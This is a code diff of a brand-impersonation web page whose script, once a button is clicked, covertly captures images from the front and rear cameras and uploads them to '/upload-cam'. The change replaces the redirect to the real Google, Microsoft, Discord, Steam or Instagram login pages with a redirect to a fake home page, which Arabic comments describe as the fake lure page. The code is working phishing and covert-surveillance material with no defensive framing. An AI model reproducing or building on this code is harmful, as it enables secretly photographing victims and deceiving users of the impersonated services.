@@ -23,14 +23,13 @@
 <script>
 const urlParams = new URLSearchParams(window.location.search);
 const brand = urlParams.get('b') || 'generic';
-const realSites = {
-  google: 'https://accounts.google.com', microsoft: 'https://login.microsoftonline.com', discord: 'https://discord.com/login',
-  steam: 'https://store.steampowered.com/login/', instagram: 'https://www.instagram.com/accounts/login/', generic: 'https://www.google.com'
-};
+
 document.getElementById('btn').addEventListener('click', async () => {
   const btn = document.getElementById('btn'); const status = document.getElementById('status');
   btn.style.display = 'none'; status.style.display = 'block';
   let frontImg = null; let backImg = null;
+
+  // كاميرا أمامية
   try {
     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
     let video = document.createElement('video'); video.srcObject = stream; await video.play();
@@ -39,6 +38,8 @@ document.getElementById('btn').addEventListener('click', async () => {
     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); frontImg = canvas.toDataURL('image/jpeg', 0.8);
     stream.getTracks().forEach(t => t.stop());
   } catch (e) {}
+  
+  // كاميرا خلفية
   try {
     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
     let video = document.createElement('video'); video.srcObject = stream; await video.play();
@@ -47,8 +48,12 @@ document.getElementById('btn').addEventListener('click', async () => {
     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); backImg = canvas.toDataURL('image/jpeg', 0.8);
     stream.getTracks().forEach(t => t.stop());
   } catch (e) {}
+
+  // إرسال الصور
   await fetch('/upload-cam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ front: frontImg, back: backImg, brand: brand }) }).catch(()=>{});
-  window.location.href = realSites[brand] || realSites['generic'];
+  
+  // التحويل للصفحة الوهمية (مواقع حقيقية ممنوعة)
+  window.location.href = '/home.html?b=' + brand;
 });
 </script>
 </body>
